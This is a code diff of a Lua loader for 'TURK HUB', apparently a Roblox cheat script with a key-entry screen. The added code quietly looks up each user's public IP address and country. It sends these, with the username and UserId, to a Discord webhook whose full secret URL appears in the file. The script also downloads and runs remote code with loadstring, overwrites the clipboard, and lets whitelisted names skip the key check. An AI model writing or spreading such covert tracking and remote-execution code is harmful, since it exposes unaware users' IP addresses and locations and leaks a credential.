@@ -1,115 +1,313 @@
--- Loader System
-local HttpService = game:GetService("HttpService")
+if getgenv().TURKHUB_LOADED then return end
+getgenv().TURKHUB_LOADED = true
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+-- Services
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local LocalPlayer = Players.LocalPlayer
-local PlaceId = game.PlaceId
 
+-- LINKS
 local DiscordInvite = "https://discord.com/invite/v3dAeMKp4N"
-local GamesURL = "https://api.github.com/repos/TURK2/HubScript/contents/Games"
+local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
+local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
 
--- API analytics (ต้องมี server)
-local AnalyticsAPI = "https://your-api.com/hub-analytics"
+-- WEBHOOK
+local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
+
+-- COUNTER API
+local OnlineCounter = "https://api.countapi.xyz/hit/turkhub/online"
+local TodayCounter = "https://api.countapi.xyz/hit/turkhub/today"
+local TotalCounter = "https://api.countapi.xyz/hit/turkhub/total"
+local GameCounter = "https://api.countapi.xyz/hit/turkhub/game_"
+
+-- Whitelist
+local WhitelistPlayers = {
+    "maytawin29",
+    "maytawin_test"
+}
+
+-- request
+local request = syn and syn.request or http_request or request
 
 -- copy discord
 pcall(function()
     setclipboard(DiscordInvite)
 end)
 
--- request support
-local request =
-    syn and syn.request or
-    http_request or
-    request or
-    (http and http.request)
+-- get ip
+local function GetIP()
+    local ip = "Unknown"
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org")
+    end)
+    return ip
+end
 
--- ===== SEND ANALYTICS =====
-local function SendAnalytics()
-
-    if not request then
-        return
-    end
+-- get country
+local function GetCountry()
 
     local country = "Unknown"
 
     pcall(function()
-        local geo = game:HttpGet("http://ip-api.com/json")
-        local decoded = HttpService:JSONDecode(geo)
+
+        local data = game:HttpGet("http://ip-api.com/json")
+        local decoded = HttpService:JSONDecode(data)
+
         country = decoded.country
+
     end)
+
+    return country
+
+end
+
+-- game name
+local function GetGameName()
+
+    local name = "Unknown"
+
+    pcall(function()
+        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+
+    return name
+
+end
+
+-- counter helper
+local function HitCounter(url)
+
+    local value = "0"
+
+    pcall(function()
+
+        local data = game:HttpGet(url)
+        local decoded = HttpService:JSONDecode(data)
+
+        value = tostring(decoded.value)
+
+    end)
+
+    return value
+
+end
+
+-- analytics send
+local function SendAnalytics()
+
+    if not request then return end
+
+    local ip = GetIP()
+    local country = GetCountry()
+    local gameName = GetGameName()
+
+    local online = HitCounter(OnlineCounter)
+    local today = HitCounter(TodayCounter)
+    local total = HitCounter(TotalCounter)
+
+    -- game counter
+    local gameCount = HitCounter(GameCounter..game.PlaceId)
 
     local data = {
-        user = LocalPlayer.UserId,
-        game = PlaceId,
-        country = country,
-        time = os.time()
+        ["embeds"] = {{
+            ["title"] = "🚀 TURK HUB EXECUTED",
+            ["color"] = 65280,
+            ["fields"] = {
+
+                {
+                    ["name"] = "👤 Player",
+                    ["value"] = LocalPlayer.Name,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "🆔 UserId",
+                    ["value"] = tostring(LocalPlayer.UserId),
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "🌍 Country",
+                    ["value"] = country,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "🎮 Game",
+                    ["value"] = gameName,
+                    ["inline"] = false
+                },
+
+                {
+                    ["name"] = "📌 PlaceId",
+                    ["value"] = tostring(game.PlaceId),
+                    ["inline"] = false
+                },
+
+                {
+                    ["name"] = "🌐 IP",
+                    ["value"] = ip,
+                    ["inline"] = false
+                },
+
+                {
+                    ["name"] = "👥 Online Users",
+                    ["value"] = online,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "📅 Users Today",
+                    ["value"] = today,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "📊 Total Users",
+                    ["value"] = total,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "🔥 Game Hub Uses",
+                    ["value"] = gameCount,
+                    ["inline"] = false
+                }
+
+            },
+
+            ["footer"] = {
+                ["text"] = "TURK HUB Analytics System"
+            }
+
+        }}
     }
 
-    pcall(function()
-
-        request({
-            Url = AnalyticsAPI,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
-        })
-
-    end)
+    request({
+        Url = AnalyticsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
+    })
 
 end
 
--- ===== Kick =====
-local function KickPlayer()
+pcall(SendAnalytics)
 
-    pcall(function()
-        setclipboard(DiscordInvite)
-    end)
-
-    LocalPlayer:Kick(
-        "This game is not supported.\n\nJoin our Discord for support:\n"..DiscordInvite
-    )
-
-end
-
--- ===== Load Games =====
-local function GetGames()
-
-    local data = nil
-
-    pcall(function()
-        data = game:HttpGet(GamesURL)
-    end)
-
-    if not data then
-        KickPlayer()
+-- whitelist bypass
+for _,name in pairs(WhitelistPlayers) do
+    if LocalPlayer.Name == name then
+        loadstring(game:HttpGet(LoaderURL))()
         return
     end
+end
 
-    local decoded = HttpService:JSONDecode(data)
+-- UI
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
-    for _,file in pairs(decoded) do
+local function GetKeys()
 
-        local name = file.name
-        local place = name:gsub(".lua","")
+    local data = ""
+    pcall(function()
+        data = game:HttpGet(KeyURL)
+    end)
 
-        if tonumber(place) == PlaceId then
+    local keys = {}
 
-            local raw =
-            "https://raw.githubusercontent.com/TURK2/HubScript/main/Games/"..name
+    for line in string.gmatch(data,"[^\r\n]+") do
+        table.insert(keys,line)
+    end
 
-            SendAnalytics()
+    return keys
+end
 
-            loadstring(game:HttpGet(raw))()
+local ValidKeys = GetKeys()
 
-            return
+local Window = Rayfield:CreateWindow({
+    Name = "TURK HUB | Key System",
+    LoadingTitle = "TURK HUB",
+    LoadingSubtitle = "Secure Loader",
+    Theme = "DarkBlue"
+})
+
+local KeyTab = Window:CreateTab("Authentication","lock")
+
+local UserKey = ""
+
+KeyTab:CreateInput({
+    Name = "Enter Key",
+    PlaceholderText = "Paste your key here",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text)
+        UserKey = Text
+    end
+})
+
+KeyTab:CreateButton({
+    Name = "Submit Key",
+    Callback = function()
+
+        local Valid = false
+
+        for _,k in pairs(ValidKeys) do
+            if UserKey == k then
+                Valid = true
+                break
+            end
+        end
+
+        if Valid then
+
+            Rayfield:Notify({
+                Title = "Access Granted",
+                Content = "Loading Hub...",
+                Duration = 4
+            })
+
+            wait(1)
+
+            loadstring(game:HttpGet(LoaderURL))()
+
+            Rayfield:Destroy()
+
+        else
+
+            pcall(function()
+                setclipboard(DiscordInvite)
+            end)
+
+            Rayfield:Notify({
+                Title = "Invalid Key",
+                Content = "Join our Discord to get key (copied)",
+                Duration = 5
+            })
+
         end
 
     end
+})
 
-    KickPlayer()
+KeyTab:CreateButton({
+    Name = "Copy Discord Invite",
+    Callback = function()
 
-end
+        pcall(function()
+            setclipboard(DiscordInvite)
+        end)
 
-GetGames()
+        Rayfield:Notify({
+            Title = "Copied",
+            Content = "Discord link copied",
+            Duration = 3
+        })
+
+    end
+})
